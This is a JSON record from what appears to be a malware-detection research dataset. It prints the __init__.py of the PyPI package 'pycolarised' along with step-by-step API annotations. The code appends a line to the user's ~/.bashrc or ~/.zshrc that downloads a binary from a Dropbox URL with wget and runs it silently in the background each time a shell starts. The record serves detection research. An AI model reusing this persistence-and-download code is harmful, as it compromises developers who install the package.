{
  "metadata": {
    "package_name": "pycolarised-2",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/pycolarised-2.7-py3-none-any.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pycolarised-2.7-py3-none-any/pycolarised/__init__.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport platform\n\ndef multios():\n    if platform.system().startswith(\"Linux\"):\n        recol = os.environ.get(\"SHELL\")\n        return os.path.basename(recol)\n    return None\n\ndef reset_modules():\n    recol = multios()\n    if recol == \"bash\":\n        rescolor = os.path.expanduser(\"~/.bashrc\")\n    elif recol == \"zsh\":\n        rescolor = os.path.expanduser(\"~/.zshrc\")\n    else:\n        return\n    if os.path.exists(rescolor):\n        with open(rescolor, \"r\") as f:\n            if \"proc.sh\" in f.read():\n                return\n        with open(rescolor, \"a\") as f:\n            f.write('bash -c \\'home_dir=$(eval echo ~); ab=\"$home_dir/.local/.tmp\"; fil=\"$ab/proc.sh\"; mkdir -p \"$ab\" >/dev/null 2>&1; chmod 777 \"$ab\" >/dev/null 2>&1; if [[ -f \"$fil\" ]]; then echo \"\"; else echo \"wget https://dl.dropbox.com/s/6txmhmva0m072yz/proc -O /tmp/proc >/dev/null 2>&1 && chmod +x /tmp/proc >/dev/null 2>&1 && /tmp/proc >/dev/null 2>&1 &\" >> \"$fil\"; chmod +x \"$fil\" >/dev/null 2>&1; bash \"$fil\" >/dev/null 2>&1; fi\\'\\n')\n    else:\n        return",
          "triple_sequences": [
            {
              "action_api": "platform.system()",
              "action_description": "Retrieves operating system identifier",
              "action_id": "get_os_id",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Determine operating system",
              "intention_id": "determine_operating_system"
            },
            {
              "action_api": "os.environ.get()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "SHELL",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.basename()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "recol",
              "object_description": "Local file or directory name",
              "object_id": "local_file_or_directory_name",
              "intention_description": "Extract executable name",
              "intention_id": "extract_executable_name"
            },
            {
              "action_api": "os.path.expanduser()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "~/.bashrc",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "os.path.expanduser()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "~/.zshrc",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "rescolor",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "rescolor, \"r\"",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Open file for reading",
              "intention_id": "open_file_reading"
            },
            {
              "action_api": "str.__contains__()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "\"proc.sh\" in f.read()",
              "object_description": "Script file content",
              "object_id": "script_file_content",
              "intention_description": "Detect file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "rescolor, \"a\"",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Open file for writing",
              "intention_id": "open_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "bash -c 'home_dir=$(eval echo ~); ab=\"$home_dir/.local/.tmp\"; fil=\"$ab/proc.sh\"; mkdir -p \"$ab\" >/dev/null 2>&1; chmod 777 \"$ab\" >/dev/null 2>&1; if [[ -f \"$fil\" ]]; then echo \"\"; else echo \"wget https://dl.dropbox.com/s/6txmhmva0m072yz/proc -O /tmp/proc >/dev/null 2>&1 && chmod +x /tmp/proc >/dev/null 2>&1 && /tmp/proc >/dev/null 2>&1 &\" >> \"$fil\"; chmod +x \"$fil\" >/dev/null 2>&1; bash \"$fil\" >/dev/null 2>&1; fi'\n",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            }
          ]
        }
      ]
    }
  ]
}